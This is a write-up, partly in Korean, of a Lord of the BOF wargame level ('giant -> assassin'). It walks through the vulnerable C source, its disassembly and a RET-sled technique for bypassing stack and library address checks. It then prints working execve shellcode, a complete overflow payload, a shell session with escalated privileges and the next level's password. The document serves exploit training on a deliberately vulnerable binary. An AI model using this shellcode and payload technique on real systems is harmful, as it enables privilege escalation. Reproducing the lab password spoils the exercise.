# Level 14, Giant -> Assassin

### assassin.c

```c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - assassin
        - no stack, no RTL
*/

#include <stdio.h>
#include <stdlib.h>

main(int argc, char *argv[])
{
        char buffer[40];

        if(argc < 2){
                printf("argv error\n");
                exit(0);
        }

        if(argv[1][47] == '\xbf')
        {
                printf("stack retbayed you!\n");
                exit(0);
        }

        if(argv[1][47] == '\x40')
        {
                printf("library retbayed you, too!!\n");
                exit(0);
        }

        strcpy(buffer, argv[1]);
        printf("%s\n", buffer);

        // buffer+sfp hunter
        memset(buffer, 0, 44);
}
```

### Analysis

#### Disassembling the "assassin"

```
Dump of assembler code for function main:
0x8048470 <main>:       push   %ebp
0x8048471 <main+1>:     mov    %ebp,%esp
0x8048473 <main+3>:     sub    %esp,40
0x8048476 <main+6>:     cmp    DWORD PTR [%ebp+8],1
0x804847a <main+10>:    jg     0x8048493 <main+35>
0x804847c <main+12>:    push   0x8048570
0x8048481 <main+17>:    call   0x8048378 <printf>
0x8048486 <main+22>:    add    %esp,4
0x8048489 <main+25>:    push   0
0x804848b <main+27>:    call   0x8048388 <exit>
0x8048490 <main+32>:    add    %esp,4
0x8048493 <main+35>:    mov    %eax,DWORD PTR [%ebp+12]
0x8048496 <main+38>:    add    %eax,4
0x8048499 <main+41>:    mov    %edx,DWORD PTR [%eax]
0x804849b <main+43>:    add    %edx,47
0x804849e <main+46>:    cmp    BYTE PTR [%edx],0xbf
0x80484a1 <main+49>:    jne    0x80484c0 <main+80>
0x80484a3 <main+51>:    push   0x804857c
0x80484a8 <main+56>:    call   0x8048378 <printf>
0x80484ad <main+61>:    add    %esp,4
0x80484b0 <main+64>:    push   0
0x80484b2 <main+66>:    call   0x8048388 <exit>
0x80484b7 <main+71>:    add    %esp,4
0x80484ba <main+74>:    lea    %esi,[%esi]
0x80484c0 <main+80>:    mov    %eax,DWORD PTR [%ebp+12]
0x80484c3 <main+83>:    add    %eax,4
0x80484c6 <main+86>:    mov    %edx,DWORD PTR [%eax]
0x80484c8 <main+88>:    add    %edx,47
0x80484cb <main+91>:    cmp    BYTE PTR [%edx],0x40
0x80484ce <main+94>:    jne    0x80484e7 <main+119>
0x80484d0 <main+96>:    push   0x8048591
0x80484d5 <main+101>:   call   0x8048378 <printf>
0x80484da <main+106>:   add    %esp,4
0x80484dd <main+109>:   push   0
0x80484df <main+111>:   call   0x8048388 <exit>
0x80484e4 <main+116>:   add    %esp,4
0x80484e7 <main+119>:   mov    %eax,DWORD PTR [%ebp+12]
0x80484ea <main+122>:   add    %eax,4
0x80484ed <main+125>:   mov    %edx,DWORD PTR [%eax]
0x80484ef <main+127>:   push   %edx
0x80484f0 <main+128>:   lea    %eax,[%ebp-40]
0x80484f3 <main+131>:   push   %eax
0x80484f4 <main+132>:   call   0x80483a8 <strcpy>
0x80484f9 <main+137>:   add    %esp,8
0x80484fc <main+140>:   lea    %eax,[%ebp-40]
0x80484ff <main+143>:   push   %eax
0x8048500 <main+144>:   push   0x80485ae
0x8048505 <main+149>:   call   0x8048378 <printf>
0x804850a <main+154>:   add    %esp,8
0x804850d <main+157>:   push   44
0x804850f <main+159>:   push   0
0x8048511 <main+161>:   lea    %eax,[%ebp-40]
0x8048514 <main+164>:   push   %eax
0x8048515 <main+165>:   call   0x8048398 <memset>
0x804851a <main+170>:   add    %esp,12
0x804851d <main+173>:   leave
0x804851e <main+174>:   ret
```

#### Estimated Stack Structure

```sh
|  char buffer[40]      | [%ebp-40]
|  SFP                  | [%ebp]
|  RET                  | [%ebp+4]
|  ARGC                 | [%ebp+8]
|  Pointer to ARGV[0]   | [%ebp+C]
```

### Exploit

#### How to pwn

RET Sled

스택 프레임의 Return Address에 어딘가에 있을 `RET` 명령어 주소를 넣는다.
`RET` 명령어는 `pop eip`와 `jmp eip`을 수행하므로, Return Address에 `RET` 명령어 주소를 넣게 되면 한번더 `RET`이 실행되게 되고, 그 아래에 있는 주소 값으로 가게 된다.

```sh
|  char buffer[40]      | [%ebp-40]
|  SFP                  | [%ebp]    
|  RET                  | [%ebp+4]  <- ESP
|  ARGC                 | [%ebp+8]
|  Pointer to ARGV[0]   | [%ebp+C]
```

스택 프레임을 나가는 `RET` 명령어 바로 앞에 Breakpoint를 건 상태에 `ESP`는 `[%ebp+4]`를 가르키고 있다. 이때 `RET`가 수행되면서 `ESP`는 한칸 내려가게 되고, 실행 흐름은 RET에 있는 주소로 넘어가게 된다.

```sh
|  char buffer[40]      | [%ebp-40]
|  SFP                  | [%ebp]    
|  RET                  | [%ebp+4]  
|  ARGC                 | [%ebp+8]  <- ESP
|  Pointer to ARGV[0]   | [%ebp+C]
```

그러나 만약 리턴 주소가 어딘가에 있을 `RET` 명령어 주소라면, 한번 더 `RET`를 수행하면서 `pop eip`와 `pop eip`로 실행흐름이 `[%ebp+8]`에 있는 주소로 넘어가게 된다. 이를 이용해 지금 정상적인 Return Address 위치인 [%ebp+4]가 스택 주소를 갖지 못하게 막고 있으므로, Return Address 아래에 쉘코드 주소를 넣고 Return Address에 `RET` 명령어 주소를 넣으면 된다!

```c
        if(argv[1][47] == '\xbf')
        {
                printf("stack retbayed you!\n");
                exit(0);
        }
```

#### Shellcode (24 bytes)

```
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
```

#### Final Payload

```
./assassin `python -c "print 'A'*44+'\x1e\x85\x04\x08'+'\xdc\xfa\xff\xbf'+'\x90'*200+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'"`
```

### Result

```
[giant@localhost giant]$ ./assassin `python -c "print 'A'*44+'\x1e\x85\x04\x08'+'\xdc\xfa\xff\xbf'+'\x90'*200+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'"`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒1▒Ph//shh/bin▒▒PS▒ᙰ
                           ̀
bash$ id
uid=514(giant) gid=514(giant) euid=515(assassin) egid=515(assassin) groups=514(giant)
bash$ my-pass
euid = 515
pushing me away
```